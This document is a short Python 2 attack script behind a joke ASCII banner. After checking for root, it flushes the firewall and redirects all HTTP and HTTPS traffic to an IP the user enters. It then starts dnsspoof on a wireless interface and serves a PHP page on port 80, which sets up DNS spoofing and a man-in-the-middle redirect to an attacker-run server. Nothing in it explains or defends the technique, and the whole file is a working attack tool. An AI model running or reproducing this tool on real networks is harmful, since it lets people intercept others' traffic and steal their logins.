################################# BANNER #####################################
r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
rr = '\033[39m'
colors=[r,g,y,b,m,c,w,rr]
import random
pp='''
                   _.-=-._     .-,     '''+random.choice(colors)+'''SOMETHING IS A JOKE!
                 .'       "-.,' /        '''+random.choice(colors)+'''-\_(^_^)_/-
                (          _.  <          
                 `=.____.="  `._\\  '''
for i in pp.split('\n'):
	print random.choice(colors)+i
print rr+'\n'

##############################################################################
import os
if not os.getgid() == 0:
        print "Root PERMISSION Required"
        exit()

from subprocess import Popen, PIPE, check_output
ip=raw_input(" IP $>: ")
ips=ip.split('.')[0]+"."+ip.split('.')[1]+"."+ip.split('.')[2]+"."+"0"
command='''
ifconfig wlp6s5 up
ifconfig wlp6s5 %s netmask 255.255.255.0
route add -net %s netmask 255.255.255.0 gw %s
sysctl -w net.ipv4.ip_forward=1 &>/dev/null
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination %s:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination %s:443
iptables -A INPUT -p tcp --sport 443 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
iptables -t nat -A POSTROUTING -j MASQUERADE
''' % (ip,ips,ip,ip,ip)
DN = open('null.txt', 'w')
#os.system('sudo dnsspoof -i lo &')
for i in command.split('\n'):
    i='sudo '+i
    Popen(i.split(' '),stdout=PIPE, stderr=DN)
Popen(['sudo','xterm','-e','dnsspoof','-i','wlp6s5'],stdout=PIPE, stderr=DN)
Popen(['xterm','-e','php','-S',ip+':80'],stdout=PIPE, stderr=DN)
die=raw_input('die')
